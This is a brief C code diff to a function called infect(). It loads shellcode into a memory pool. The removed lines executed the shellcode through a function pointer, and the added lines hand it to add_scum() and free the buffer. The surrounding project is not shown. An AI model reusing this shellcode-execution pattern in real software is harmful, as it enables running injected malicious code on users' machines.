@@ -27,16 +27,16 @@ get_shellcode(char **buf)
 void
 infect(void)
 {
-    void (*func)(void);
     char *buf = NULL;
     unsigned len;
+    void *addr = spawn_pool;
 
 
     len = get_shellcode(&buf);
 
-    memcpy(spawn_pool, buf, len);
+    memcpy(addr, buf, len);
 
-    func = spawn_pool;
+    add_scum(addr);
 
-    func();
+    free(buf);
 }
